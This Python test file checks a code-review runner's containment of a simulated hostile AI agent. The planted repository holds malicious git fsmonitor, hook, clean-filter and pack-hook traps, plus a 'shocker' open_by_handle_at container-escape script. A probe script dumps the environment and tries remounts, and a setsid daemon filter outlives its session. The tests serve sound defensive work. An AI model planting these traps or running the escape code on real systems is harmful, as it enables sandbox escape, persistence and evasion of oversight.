# SPDX-License-Identifier: LicenseRef-Proprietary

"""A hostile repository against the real reader (#745, step 4): E15 of the plan's table.

What the agent plants in its repository (a `core.fsmonitor`, hooks, a clean filter, a pack hook)
is read by git where git is run for the runner, which is the reader: a container with no network,
no token and no other mount, under the runtime of the lane (`LANE_RUNTIME`: `sysbox-runc` on a VM
with Sysbox, `runc` in CI). Two things are proven. What git's options can stop does not start. And
what they cannot stop (a filter driver) runs in the reader and is contained: it has no network, no
socket of the Docker daemon, no file of the VM, no secret, and a call of `open_by_handle_at`, the
one a reader with `DAC_READ_SEARCH` as the VM's root could use to read and write the VM's root file
system, is refused. The refusal under `runc` is the missing capability; the one under Sysbox is
the user namespace (a VM only proves that one: this lane's `runc` has none)."""

import os
import time
from pathlib import Path

from fakes.wire.formats import Turn
from lane_support import (
    BRANCH,
    bash,
    docker,
    lane_turn,
    lane_workspace,
    says,
    wait_for,
    write_file,
)
from opencode_native import REAL_KEY

from code_reviewer_runner.implementer.git_workspace import LEFTOVER_MESSAGE
from code_reviewer_runner.implementer.reader import (
    READER_CONTAINER_NAME,
    READER_WRITER_CONTAINER_NAME,
)
from git_support import TOKEN, raw

SHOCKER = r"""
import ctypes, errno, os, struct, sys
libc = ctypes.CDLL(None, use_errno=True)
def handle_of(path):
    buf = ctypes.create_string_buffer(8 + 128)
    struct.pack_into("I", buf, 0, 128)
    mount_id = ctypes.c_int()
    if libc.syscall(303, -100, path.encode(), buf, ctypes.byref(mount_id), 0) != 0:
        return None
    size, kind = struct.unpack_from("Ii", buf, 0)
    return kind, bytes(buf[8:8 + size])
def open_handle(mount_fd, kind, data):
    buf = ctypes.create_string_buffer(8 + len(data))
    struct.pack_into("Ii", buf, 0, len(data), kind)
    buf[8:8 + len(data)] = data
    fd = libc.syscall(304, mount_fd, buf, os.O_RDONLY)
    return "OPENED" if fd >= 0 else errno.errorcode.get(ctypes.get_errno(), "?")
mount_fd = os.open("/repo", os.O_RDONLY)
known = handle_of("/repo/README.md")
print("name_to_handle_at:", "ok" if known else "refused")
if known:
    kind, data = known
    print("own file:", open_handle(mount_fd, kind, data))
    forged = struct.pack("<Q", int(sys.argv[1])) + b"\0\0\0\0" + data[12:]
    print("root of the VM:", open_handle(mount_fd, kind, forged))
"""

FACTS = r"""#!/bin/sh
# What a program run by git in the reader finds out about where it is, written to $1.
{
  echo "uid: $(id -u)"
  echo "net: $(tail -n +3 /proc/net/dev | cut -d: -f1 | tr -d ' ' | tr '\n' ' ')"
  echo "work: $(ls /work 2>&1 | head -1)"
  echo "socket: $(ls /var/run/docker.sock /run/docker.sock 2>&1 | head -1)"
  echo "caps: $(grep '^CapEff' /proc/self/status | cut -f2)"
  echo "write-root: $(touch /trap-root 2>&1)"
  echo "write-volume: $(touch /repo/trap-volume 2>&1 && echo ALLOWED)"
  echo "remount-volume: $(mount -o remount,rw /repo 2>&1 && echo ALLOWED)"
  echo "write-volume-after: $(touch /repo/trap-volume-after 2>&1 && echo ALLOWED)"
  echo "remount-root: $(mount -o remount,rw / 2>&1 && echo ALLOWED)"
  echo "environment: $(env | tr '\n' ' ')"
  echo "shocker:"
  /opt/venv/bin/python -I /repo/shocker.py ROOT_INODE 2>&1
} > "$1" 2>&1
"""


def plant(repo: Path) -> None:
    """What a hostile agent leaves in its repository."""
    root_inode = str(os.stat("/").st_ino)
    (repo / "shocker.py").write_text(SHOCKER)
    (repo / "facts.sh").write_text(FACTS.replace("ROOT_INODE", root_inode))
    traps = {
        "trap-fsmonitor.sh": "/repo/facts.sh /tmp/ran-fsmonitor\nexit 0\n",
        "trap-hook.sh": "/repo/facts.sh /tmp/ran-hook\nexit 0\n",
        "trap-pack.sh": '/repo/facts.sh /tmp/ran-pack\nexec "$@"\n',
        "trap-filter.sh": "/repo/facts.sh /tmp/ran-filter-$$\nexec cat\n",
    }
    for name, body in traps.items():
        (repo / name).write_text("#!/bin/sh\n" + body)
    hooks = repo / "hooks"
    hooks.mkdir()
    for hook in ("pre-commit", "post-commit", "commit-msg", "pre-push", "post-checkout"):
        (hooks / hook).write_text("#!/bin/sh\n/repo/trap-hook.sh\n")
    for path in [*repo.glob("*.sh"), *hooks.iterdir()]:
        path.chmod(0o755)
    with (repo / ".git" / "config").open("a") as config:
        config.write(
            "[core]\n\tfsmonitor = /repo/trap-fsmonitor.sh\n\thooksPath = /repo/hooks\n"
            '[filter "trap"]\n\tclean = /repo/trap-filter.sh\n'
            "[uploadpack]\n\tpackObjectsHook = /repo/trap-pack.sh\n"
        )
    (repo / ".gitattributes").write_text("* filter=trap\n")
    # A tracked file whose content changed: git has to read it through the filter to know.
    with (repo / "README.md").open("a") as readme:
        readme.write("changed by the agent\n")


def in_reader(name: str, script: str) -> str:
    return docker("exec", name, "/bin/sh", "-c", script, check=False).stdout


def leftovers(name: str) -> list[str]:
    return in_reader(name, "ls /tmp").split()


# #745-E15
def test_a_hostile_repository_runs_nothing_the_options_can_stop_and_what_runs_is_contained(
    tmp_path: Path,
) -> None:
    with lane_workspace(tmp_path) as lane:
        workspace = lane.workspace
        plant(workspace.repo)

        # The look at the tree, the leftover commit and the final push, all through the reader.
        assert workspace.dirty() is True
        sha = workspace.commit_all()
        report = workspace.push_all(seconds=60.0)

        assert sha is not None
        assert [(b.name, b.pushed) for b in report.branches] == [(BRANCH, True)]
        assert lane.origin.tip(BRANCH) == sha
        # What an option stops did not start, in either reader: the fsmonitor, the hooks, the
        # hook of the pack.
        for reader in (READER_CONTAINER_NAME, READER_WRITER_CONTAINER_NAME):
            files = leftovers(reader)
            for trap in ("ran-fsmonitor", "ran-hook", "ran-pack"):
                assert trap not in files, (reader, trap)
        # The clean filter cannot be stopped by naming it: it ran, in the reader, and was contained.
        facts = {
            reader: in_reader(reader, "cat /tmp/ran-filter-* 2>/dev/null")
            for reader in (READER_CONTAINER_NAME, READER_WRITER_CONTAINER_NAME)
        }
        assert any(facts.values()), "the filter driver ran in a reader"
        for reader, text in facts.items():
            if text:
                contained(text, writable=reader == READER_WRITER_CONTAINER_NAME)
        # The look at the tree (`dirty`) is made in the read-only reader, and the filter ran there.
        assert facts[READER_CONTAINER_NAME], "the read-only reader ran the filter"
        # The mirror holds the commit the system made, and the runner's git config is its own.
        message = raw(
            "--git-dir", str(workspace.mirror), "log", "-1", "--format=%s", sha or "",
            git=workspace.git,
        )  # fmt: skip
        assert message == LEFTOVER_MESSAGE
        # The control: the same trap run the way git would have without the options runs, and is
        # contained all the same. Without it the options above would prove nothing.
        in_reader(
            READER_CONTAINER_NAME,
            "cd /repo && git -c safe.directory=/repo status --porcelain >/dev/null 2>&1; true",
        )
        assert "ran-fsmonitor" in leftovers(READER_CONTAINER_NAME)
        contained(
            in_reader(READER_CONTAINER_NAME, "cat /tmp/ran-fsmonitor"),
            writable=False,
            production=False,
        )


def fact(text: str, name: str) -> str:
    """The value of one line `<name>: <value>` of what a trap wrote."""
    return text.split(f"\n{name}: ", 1)[1].split("\n")[0]


def contained(text: str, *, writable: bool, production: bool = True) -> None:
    """What the facts a trap wrote say about where it ran. `production` is a command the runner
    started (its bounding set is cut to `DAC_OVERRIDE`); the control is a plain exec, which holds
    whatever the runtime gives the container's root (every capability under Sysbox) and must be
    contained all the same."""
    text = "\n" + text
    assert "uid: 0" in text
    if production:
        assert fact(text, "caps") == "0000000000000002"
    if not writable:
        # The volume is read-only for it, and no remount, with this command's capabilities or
        # without them (Sysbox: the user namespace locks the mount's flags), makes it writable.
        assert "Read-only file system" in fact(text, "write-volume")
        assert "ALLOWED" not in fact(text, "remount-volume") and fact(text, "remount-volume")
        assert "Read-only file system" in fact(text, "write-volume-after")
    assert "ALLOWED" not in fact(text, "remount-root") and fact(text, "remount-root")
    assert "net: lo " in text, "no network but loopback"
    assert "work: " in text and "No such file" in text.split("work: ")[1].split("\n")[0]
    assert "socket: " in text and "No such file" in text.split("socket: ")[1].split("\n")[0]
    assert "Read-only file system" in text.split("write-root: ")[1].split("\n")[0]
    for secret in (TOKEN, REAL_KEY):
        assert secret not in text
    # open_by_handle_at is refused, for a file of the repository and for the root of the VM.
    assert "own file: EPERM" in text or "name_to_handle_at: refused" in text
    assert "root of the VM: EPERM" in text or "name_to_handle_at: refused" in text
    assert "OPENED" not in text


DAEMON_MARK = "reader-daemon-mark"
# A clean filter that leaves a daemon behind: `setsid` puts it in a session of its own, so the end
# of the command that started it does not touch it, and it keeps changing the repository.
DAEMON_FILTER = f"""#!/bin/sh
setsid sh -c 'while :; do date +%s%N > /repo/{DAEMON_MARK}; sleep 0.05; done' > /dev/null 2>&1 &
exec cat
"""
# The processes of a reader that carry the mark (this command's own cmdline holds it in two pieces).
MARK_PATTERN = f"'{DAEMON_MARK[:7]}''{DAEMON_MARK[7:]}'"
ALIVE = (
    "for p in /proc/[0-9]*; do "
    f"tr '\\0' ' ' < $p/cmdline 2>/dev/null | grep -q {MARK_PATTERN} && echo $p; "
    "done"
)


def alive_in(reader: str) -> list[str]:
    own = in_reader(reader, "echo $$").strip()
    return [p for p in in_reader(reader, ALIVE).split() if p != f"/proc/{own}"]


def daemon_repo(repo: Path) -> None:
    (repo / "daemon-filter.sh").write_text(DAEMON_FILTER)
    (repo / "daemon-filter.sh").chmod(0o755)
    with (repo / ".git" / "config").open("a") as config:
        config.write('[filter "daemon"]\n\tclean = /repo/daemon-filter.sh\n')
    (repo / ".gitattributes").write_text("* filter=daemon\n")
    with (repo / "README.md").open("a") as readme:
        readme.write("changed by the agent\n")


# #745: a process a filter leaves in a reader is gone before the push
def test_a_process_a_filter_leaves_behind_does_not_survive_the_reset_of_the_readers(
    tmp_path: Path,
) -> None:
    with lane_workspace(tmp_path) as lane:
        workspace = lane.workspace
        daemon_repo(workspace.repo)

        assert workspace.dirty() is True
        sha = workspace.commit_all()

        assert sha is not None
        # The daemon the commit's filter started lives on in the reader that can write, and goes on
        # changing the repository: this is what the reset is for.
        assert wait_for(lambda: bool(alive_in(READER_WRITER_CONTAINER_NAME))), "the control"
        first = (workspace.repo / DAEMON_MARK).read_text()
        assert wait_for(lambda: (workspace.repo / DAEMON_MARK).read_text() != first), "it writes"

        assert workspace.quiet_readers(seconds=30.0) is True

        for reader in (READER_CONTAINER_NAME, READER_WRITER_CONTAINER_NAME):
            assert alive_in(reader) == [], reader
        last = (workspace.repo / DAEMON_MARK).read_text()
        time.sleep(0.5)
        assert (workspace.repo / DAEMON_MARK).read_text() == last, "nothing writes any more"
        # The readers are back: the push goes through them.
        report = workspace.push_all(seconds=60.0)
        assert [(b.name, b.pushed) for b in report.branches] == [(BRANCH, True)]
        assert lane.origin.tip(BRANCH) == sha


# #745: DAC_OVERRIDE is what the readers keep because the agent's other users own files
def test_what_the_agents_other_users_own_is_committed_with_the_one_capability_the_readers_keep(
    tmp_path: Path,
) -> None:
    with lane_workspace(tmp_path) as lane:
        workspace = lane.workspace
        repo = workspace.repo
        private = repo / "private.txt"
        private.write_text("mode 600, owned by another user\n")
        private.chmod(0o600)
        data = repo / "pgdata"
        data.mkdir()
        (data / "PG_VERSION").write_text("18\n")
        data.chmod(0o700)
        for path in (private, data / "PG_VERSION", data):
            os.chown(path, 999, 999)

        assert workspace.dirty() is True
        sha = workspace.commit_all()
        report = workspace.push_all(seconds=60.0)

        assert sha is not None
        assert [(b.name, b.pushed) for b in report.branches] == [(BRANCH, True)]
        tree = raw(
            "--git-dir", str(workspace.mirror), "ls-tree", "-r", "--name-only", sha,
            git=workspace.git,
        )  # fmt: skip
        assert "private.txt" in tree.split() and "pgdata/PG_VERSION" in tree.split()


# #745: the end of a whole turn does it: the system commits the leftover, the filter starts a daemon
# in the reader that can write, and nothing of it is alive when the push has been made
def test_a_daemon_the_leftover_commit_starts_in_a_reader_is_gone_when_the_turn_has_pushed(
    tmp_path: Path,
) -> None:
    def script(repo: Path) -> list[Turn]:
        return [
            write_file(repo, "df.sh", DAEMON_FILTER),
            write_file(repo, ".gitattributes", "* filter=daemon\n"),
            bash("chmod +x df.sh && git config filter.daemon.clean /repo/df.sh"),
            write_file(repo, "notes.txt"),
            says("Done."),
            says("I will not commit."),
        ]

    with lane_turn(tmp_path, script) as turned:
        result = turned.result

        assert result.ok, (result.error_code, result.error_detail, result.notes)
        assert [c.subject for c in result.commits] == [LEFTOVER_MESSAGE]
        assert result.pushed and turned.origin_tip() == result.head_commit
        assert (turned.workspace.repo / DAEMON_MARK).exists(), "the filter ran: the control"
        for reader in (READER_CONTAINER_NAME, READER_WRITER_CONTAINER_NAME):
            assert alive_in(reader) == [], reader
        mark = (turned.workspace.repo / DAEMON_MARK).read_text()
        time.sleep(0.5)
        assert (turned.workspace.repo / DAEMON_MARK).read_text() == mark, "nothing writes any more"
